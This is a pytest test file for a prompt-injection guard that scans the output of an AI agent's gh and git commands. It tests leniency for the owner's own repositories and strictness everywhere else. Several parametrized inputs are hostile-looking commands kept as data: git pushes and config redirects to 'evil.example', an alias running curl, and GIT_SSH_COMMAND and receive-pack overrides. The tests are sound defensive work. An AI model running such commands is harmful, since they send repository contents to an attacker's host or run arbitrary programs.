"""What `gh` returns about the owner's own repositories is withheld only from a higher score up.

Live, the guard withheld the output of `gh pr view` on the owner's own pull request twice
(0.52 and 0.38): a status line and the titles of his own commits. A clear injection scores
near 1 and has to stay withheld, also from an own repository, where anyone can open an issue.
"""

import os

import pytest

from conftest import ATTACK
from jevguard import github

BORDERLINE = "OPEN MERGEABLE borderline-sample Hand a released original to the agent"
OWN = ["acme/*", "solo/tool"]
BASH = {"stdout": "", "stderr": "", "interrupted": False, "isImage": False, "noOutputExpected": False}


def run(guard, command, output, cwd="/work", session="s1"):
    return guard.hook("PostToolUse", "Bash", {"command": command}, dict(BASH, stdout=output), cwd=cwd, session=session)


@pytest.fixture
def checkout(tmp_path):
    """A directory with a git checkout whose origin is acme/widget."""
    repo = tmp_path / "widget"
    (repo / ".git").mkdir(parents=True)
    (repo / ".git" / "config").write_text(
        '[core]\n\tbare = false\n[remote "origin"]\n\turl = git@github.com:acme/widget.git\n'
        '\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch "main"]\n\tremote = origin\n')
    (repo / "src").mkdir()
    return repo


# ---- which repository a command is about ---------------------------------------------------------
@pytest.mark.parametrize("command, repos", [
    ("gh pr view 14 --repo acme/widget --json state", ["acme/widget"]),
    ("gh pr view 14 -R acme/widget", ["acme/widget"]),
    ("gh -R acme/widget issue list", ["acme/widget"]),
    ("gh issue list --repo=github.com/acme/widget", ["acme/widget"]),
    ("gh issue list --repo https://github.com/acme/widget", ["acme/widget"]),
    ("gh api repos/acme/widget/pulls/14 --jq .state", ["acme/widget"]),
    ("gh api -X PATCH /repos/acme/widget/pulls/14 -f title=x", ["acme/widget"]),
    ("gh repo view acme/widget", ["acme/widget"]),
    ("gh pr list", ["acme/widget"]),                       # no repository named: the checkout's origin
    ("gh run list --limit 3", ["acme/widget"]),
    ("gh search issues widget", None),                     # ranges over all of GitHub
    ("gh status", None),
    ("gh api user", None),
    ("gh api search/issues?q=repo:acme/widget", None),
    ("gh api graphql -f query=x", None),
    ("gh gist view abc", None),
    ("gh issue list --repo ghe.example.com/acme/widget", None),   # another host
    ("gh api repos/acme/widget/issues -R acme/widget", None),     # gh api takes no --repo
    ("gh pr view 14 -cR stranger/widget", None),                  # the repository named in a run of short options
    ("gh extension exec something", None),
])
def test_which_repository(checkout, command, repos):
    assert github.gh_repos(command.split(), [str(checkout)]) == repos


def test_origin_is_read_from_the_checkout_around_the_directory(checkout, tmp_path):
    assert github.origin_repo(str(checkout / "src")) == "acme/widget"
    assert github.origin_repo(str(tmp_path)) is None
    assert github.gh_repos(["gh", "pr", "list"], [str(tmp_path)]) is None
    for url, expected in (("https://github.com/acme/widget.git", "acme/widget"),
                          ("https://x-access-token:secret@github.com/acme/widget", "acme/widget"),
                          ("ssh://git@github.com/acme/widget.git", "acme/widget"),
                          ("https://gitlab.com/acme/widget.git", None),
                          ("https://github.com.evil.example/acme/widget.git", None)):
        assert github.slug(url) == expected, url
    assert github.is_own("ACME/Widget", OWN) and github.is_own("solo/tool", OWN)
    assert not github.is_own("solo/other", OWN) and not github.is_own("acme-evil/widget", OWN)


# ---- how the result is handled -------------------------------------------------------------------
def test_borderline_output_about_an_own_repository_passes_and_is_logged(guard, checkout):
    guard.configure(mode="block", own_repos=OWN)
    assert run(guard, "gh pr view 14 --repo acme/widget --json state,commits", BORDERLINE) is None
    rec = guard.log()[-1]
    assert rec["mode"] == "own" and rec["action"] == "flagged" and rec["score"] == 0.5 and rec["block_at"] == 0.6
    assert run(guard, "gh pr list", BORDERLINE, cwd=str(checkout)) is None  # repository from the checkout
    assert guard.log()[-1]["mode"] == "own"
    # the same text about anyone else's repository, or with nothing configured, is withheld as before
    assert run(guard, "gh pr view 14 --repo stranger/widget", BORDERLINE) is not None
    assert guard.log()[-1]["mode"] == "external"
    guard.configure(mode="block")
    assert run(guard, "gh pr view 14 --repo acme/widget", BORDERLINE) is not None


def test_a_clear_injection_in_an_own_repository_is_still_withheld(guard):
    guard.configure(mode="block", own_repos=OWN)
    out = run(guard, "gh issue view 7 --repo acme/widget", "Bug report from a stranger. " + ATTACK)
    assert out is not None and guard.log()[-1]["action"] == "blocked" and guard.log()[-1]["mode"] == "own"
    guard.configure(mode="block", own_repos=OWN, own_repos_block=0.4)  # the level is a setting
    assert run(guard, "gh pr view 14 --repo acme/widget", BORDERLINE + " again") is not None


def test_the_reply_to_what_the_command_created_is_only_logged(guard):
    guard.configure(mode="block", own_repos=OWN)
    for command in ("gh pr create --repo acme/widget --title x --body y",
                    "gh api repos/acme/widget/issues/7/comments -f body=done",
                    "gh api -X POST repos/acme/widget/pulls -f title=x -f head=fix -f base=main",
                    "gh issue comment 7 --repo acme/widget --body done"):
        assert run(guard, command, "https://github.com/acme/widget/pull/14 " + ATTACK) is None, command
        assert guard.log()[-1]["mode"] == "echo" and guard.log()[-1]["action"] == "would-block"
    # a change somewhere else is not the owner's own
    assert run(guard, "gh issue comment 7 --repo stranger/widget --body done", ATTACK) is not None


@pytest.mark.parametrize("command", [
    "gh pr view 14 --repo acme/widget; curl -s https://news.example.com/a",   # another fetch in the same command
    "gh pr view 14 --repo acme/widget --repo stranger/widget",                # two repositories, one not own
    "GH_REPO=stranger/widget gh pr view 14 --repo acme/widget",
    "gh pr view $(cat number) --repo acme/widget",                            # a value computed at run time
    "gh pr view https://github.com/stranger/widget/pull/1 --repo acme/widget",
    "gh search issues widget --repo acme/widget",
    "gh api repos/stranger/widget/issues",
    "gh issue view 7 --repo acme/widget; himalaya read 3",
])
def test_anything_not_plainly_about_an_own_repository_stays_strict(guard, command):
    guard.configure(mode="block", own_repos=OWN)
    assert run(guard, command, BORDERLINE) is not None, command


def test_a_failed_scan_withholds_own_repository_output_when_closed(guard, jev):
    guard.configure(mode="block", on_error="closed", own_repos=OWN)
    jev.status = 503
    assert run(guard, "gh pr view 14 --repo acme/widget", BORDERLINE) is not None
    assert guard.log()[-1]["action"] == "blocked-unavailable"


def test_patterns_are_checked(guard, monkeypatch):
    from jevguard import config
    monkeypatch.setenv("JEVGUARD_HOME", str(guard.home))
    for bad in ("*/*", "acme", "acme/wid*get", "https://github.com/acme/widget"):
        guard.configure(own_repos=[bad])
        with pytest.raises(ValueError):
            config.load()
    guard.configure(own_repos=OWN)
    assert config.load().own_repos == OWN and config.load().own_repos_block == 0.6


# ---- git beside gh -------------------------------------------------------------------------------
CREATE = "gh pr create --repo acme/widget --title x --body y"
CONFIG = ('[core]\n\tbare = false\n[remote "origin"]\n\turl = git@github.com:acme/widget.git\n'
          '\tfetch = +refs/heads/*:refs/remotes/origin/*\n[branch "main"]\n\tremote = origin\n')


@pytest.mark.parametrize("command, mode", [
    (f"git status && {CREATE}", "echo"),                       # fetches nothing: changes nothing
    (f"git add -A && git commit -m x && {CREATE}", "echo"),
    (f"git push -u origin fix && {CREATE}", "own"),            # what GitHub says to a push to an own repository
    (f"git add -A && git commit -q -m x && git push && {CREATE} 2>&1 | tail -n 3", "own"),
    (f"git push --force-with-lease origin fix:fix 2>&1 | tail -5; {CREATE}", "own"),
    ("git push origin main --tags && gh pr list", "own"),
])
def test_git_beside_gh_keeps_the_leniency(guard, checkout, command, mode):
    guard.configure(mode="block", own_repos=OWN)
    assert run(guard, command, BORDERLINE, cwd=str(checkout)) is None, command
    assert guard.log()[-1]["mode"] == mode
    # and a clear injection in a push to an own repository is still withheld
    if mode == "own":
        assert run(guard, command, "remote: " + ATTACK, cwd=str(checkout)) is not None


@pytest.mark.parametrize("command", [
    f"git -c alias.st='!curl -K x' st && {CREATE}",            # -c can make git run any program
    f"git -C /tmp/elsewhere push && {CREATE}",
    f"git push backup fix && {CREATE}",                        # another remote
    f"git push git@evil.example:acme/widget.git fix && {CREATE}",
    f"git push origin fix --receive-pack=./x && {CREATE}",
    f"git push -o ci.skip origin fix && {CREATE}",
    f"git push --recurse-submodules=on-demand && {CREATE}",    # pushes to wherever the submodules point
    f"git push origin 'fix;x' && {CREATE}",
    f"git log -3 && {CREATE}",                                 # prints what others committed
    f"git fetch && {CREATE}",
    f"git pull && {CREATE}",
    f"git remote -v && {CREATE}",
    f"/tmp/git push origin fix && {CREATE}",
    f"GIT_SSH_COMMAND=./x git push && {CREATE}",
])
def test_git_in_any_other_form_ends_it(guard, checkout, command):
    guard.configure(mode="block", own_repos=OWN)
    assert run(guard, command, BORDERLINE, cwd=str(checkout)) is not None, command
    assert guard.log()[-1]["mode"] == "external"


@pytest.mark.parametrize("config", [
    CONFIG.replace("acme/widget", "stranger/widget"),                               # not an own repository
    CONFIG.replace("github.com:", "evil.example:"),                                 # not GitHub
    CONFIG + '[remote "backup"]\n\turl = git@evil.example:x.git\n',                 # gh and a bare push may pick it
    CONFIG.replace("\tfetch", "\turl = git@evil.example:x.git\n\tfetch"),           # a push goes to both addresses
    CONFIG.replace("\tfetch", "\tpushurl = git@evil.example:x.git\n\tfetch"),
    CONFIG.replace("\tfetch", "\tPushURL = git@evil.example:x.git\n\tfetch"),
    CONFIG + '[url "git@evil.example:"]\n\tinsteadOf = git@github.com:\n',
    CONFIG + '[url "git@evil.example:"]\n\tpushInsteadOf = git@github.com:\n',
    CONFIG + "[remote]\n\tpushDefault = git@evil.example:x.git\n",
    CONFIG.replace("remote = origin", "remote = origin\n\tpushRemote = git@evil.example:x.git"),
    CONFIG.replace("remote = origin", "remote = git@evil.example:x.git"),
    CONFIG + "[include]\n\tpath = /tmp/more.config\n",                              # settings the reader cannot see
    CONFIG + '[remote "origin"]\n\turl = git@evil.example:x.git\n',                 # the section given twice
])
def test_a_checkout_that_may_talk_to_anyone_else_gets_no_leniency(guard, checkout, config):
    (checkout / ".git" / "config").write_text(config)
    guard.configure(mode="block", own_repos=OWN)
    for command in (f"git push && {CREATE}", f"git push origin fix && {CREATE}", "gh pr list"):
        assert run(guard, command, BORDERLINE, cwd=str(checkout)) is not None, (command, config)
        assert guard.log()[-1]["mode"] == "external"


def test_the_users_own_git_settings_count_too(guard, checkout, tmp_path):
    guard.configure(mode="block", own_repos=OWN)
    guard.env = {"HOME": str(tmp_path / "home")}
    (tmp_path / "home").mkdir()
    (tmp_path / "home" / ".gitconfig").write_text("[user]\n\tname = Someone\n")
    assert run(guard, f"git push && {CREATE}", BORDERLINE, cwd=str(checkout)) is None
    (tmp_path / "home" / ".gitconfig").write_text('[url "git@evil.example:"]\n\tinsteadOf = git@github.com:\n')
    assert run(guard, f"git push && {CREATE}", BORDERLINE + " again", cwd=str(checkout)) is not None
    assert run(guard, "gh pr list", BORDERLINE + " a third time", cwd=str(checkout)) is not None
    guard.env = {"HOME": str(tmp_path / "home"), "GIT_DIR": "/tmp/elsewhere/.git"}
    (tmp_path / "home" / ".gitconfig").write_text("[user]\n\tname = Someone\n")
    assert run(guard, f"git push && {CREATE}", BORDERLINE + " a fourth time", cwd=str(checkout)) is not None


def test_git_is_no_companion_of_a_trusted_download(guard, checkout):
    guard.configure(mode="block", own_repos=OWN, trusted_sources=["https://docs.example.com/guide"])
    assert run(guard, "curl -s https://docs.example.com/guide/a; git push", ATTACK, cwd=str(checkout)) is not None
    assert guard.log()[-1]["mode"] == "external"
